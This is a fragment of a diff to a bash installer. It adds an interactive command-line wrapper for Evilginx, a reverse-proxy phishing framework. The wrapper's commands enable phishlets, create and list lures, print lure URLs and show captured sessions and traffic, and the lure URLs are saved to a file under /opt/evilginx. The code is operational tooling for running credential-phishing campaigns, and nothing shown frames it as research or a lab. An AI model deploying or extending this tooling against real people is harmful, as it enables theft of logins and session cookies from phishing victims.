+        echo "$url" >> /opt/evilginx/lures.txt
+    else
+        echo -e "${RED}[✗] Failed to create lure${NC}"
+    fi
+}
+
+list_lures() {
+    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets -lures
+}
+
+get_lure_url() {
+    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets <<EOF
+lures get-url $1
+exit
+EOF
+}
+
+# Main loop
+echo -e "${CYAN}Evilginx CLI - Type 'help' for commands${NC}"
+echo ""
+
+while true; do
+    echo -n -e "${GREEN}evilginx> ${NC}"
+    read -r cmd args
+
+    case "$cmd" in
+        "" ) continue ;;
+        help) show_help ;;
+        restart) restart ;;
+        status) status ;;
+        traffic) traffic ;;
+        sessions) sessions ;;
+        phishlets) phishlets ;;
+        enable) enable_phishlet "$args" ;;
+        disable) disable_phishlet "$args" ;;
+        lures) 
+            case "$args" in
+                create*) create_lure "${args#create }" ;;
+                list) list_lures ;;
+                url*) get_lure_url "${args#url }" ;;
+                *) echo "Usage: lures <create|list|url> [name|id]";;
+            esac
+            ;;
+        exit) echo -e "${GREEN}Goodbye!${NC}"; exit 0 ;;
+        *) echo -e "${RED}Unknown command. Type 'help'${NC}" ;;
+    esac
+    echo ""
+done
+CLIEOF
+
+chmod +x /usr/local/bin/evilginx-cli
 
 log "Installation complete!"
 echo ""
